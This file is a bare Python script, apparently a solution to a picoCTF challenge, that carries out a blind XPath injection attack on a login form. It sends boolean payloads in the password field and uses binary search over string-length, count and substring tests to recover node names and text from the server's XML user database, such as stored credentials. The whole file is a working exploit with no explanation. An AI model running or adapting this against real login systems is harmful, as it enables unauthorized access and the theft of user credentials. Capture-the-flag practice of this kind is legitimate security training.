import requests,string
S=string.ascii_letters+string.digits+"{_}@!#:., ?"
url="http://wily-courier.picoctf.net:58913/"
username="admin"
def query(payload):
    data={"name":"admin","pass":"' or "+payload+" or '"}
    html=requests.post(url,data=data).text
    return 'Login failure' not in html
def dfs(path,endpoint=False):
    if endpoint:
        l=0
        r=1000
        text_path=path+'/text()'
        while l!=r:
            mid=((l+r)>>1)
            payload=f'string-length({text_path})>{mid}'
            if query(payload):
                l=mid+1
            else:
                r=mid
        real_length=l
        print(real_length)
        text=''
        for j in range(1,real_length+1):
            l=0
            r=len(S)-1
            while l!=r:
                mid=((l+r)>>1)
                payload=f"contains('{S[l:mid+1]}',substring({text_path}, {j}, 1))"
                if query(payload):
                    r=mid
                else:
                    l=mid+1
            text+=S[l]
            print(text)
        return 
    cnt=0
    for i in range(20):
        newpath=path+'/*'
        payload=f'count({newpath})={i}'
        if query(payload):
            cnt=i
            break
    print(path,cnt)
    if cnt==0:
        dfs(path,True)
        return
    for i in range(1,cnt+1):
        real_length=0
        for length in range(20):
            payload=f'string-length(name({path}/*[{i}]))={length}'
            if query(payload):
                real_length=length
                break
        print(real_length)
        name=''
        for j in range(1,real_length+1):
            l=0
            r=len(S)-1
            while l!=r:
                mid=((l+r)>>1)
                payload=f"contains('{S[l:mid+1]}',substring(name({path}/*[{i}]), {j}, 1))"
                if query(payload):
                    r=mid
                else:
                    l=mid+1
            name+=S[l]
            print(name)
        dfs(path+'/'+name)
dfs("/db/users/user[position()=3]")